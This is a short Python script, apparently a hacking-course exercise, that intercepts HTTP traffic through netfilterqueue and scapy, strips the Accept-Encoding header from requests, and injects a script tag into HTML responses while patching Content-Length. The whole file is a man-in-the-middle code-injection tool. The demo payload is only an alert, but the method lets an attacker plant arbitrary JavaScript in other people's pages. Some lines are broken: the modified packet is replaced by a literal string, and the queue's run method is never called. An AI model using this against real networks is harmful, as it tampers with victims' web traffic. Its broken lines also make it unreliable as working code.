import netfilterqueue
from scapy.all import DNSRR,IP,TCP,Raw
import re

def set_load(packet,load):
	packet[Raw].load = load
	del packet[IP].len
	del packet[IP].chksum
	del packet[TCP].chksum
	return packet

def process_packet(packet):
	scapy_packet = IP(packet.get_payload())
	if scapy_packet.haslayer(Raw) :
		load = scapy_packet[Raw].load
		if scapy_packet[TCP].dport == 80:
			print(scapy_packet.show())
			load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
			
				
		elif scapy_packet[TCP].sport == 80:
			print(scapy_packet.show())
			injection_code = "<script>alert('te hackeo xd');</script>"
			load = load.replace("</body>", injection_code + "</body>")
			content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
			if content_length_search and "text/html" in load:
				content_length = content_length_search.group(1)
				new_content_length = int(content_length) + len(injection_code)
				load = load.replace(content_length, str(new_content_length))
		if load != scapy_packet[Raw].load:
			new_packet = set_load(scapy_packet, load)
			packet.set_payload(b'new_packet')
				
	packet.accept()
	
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run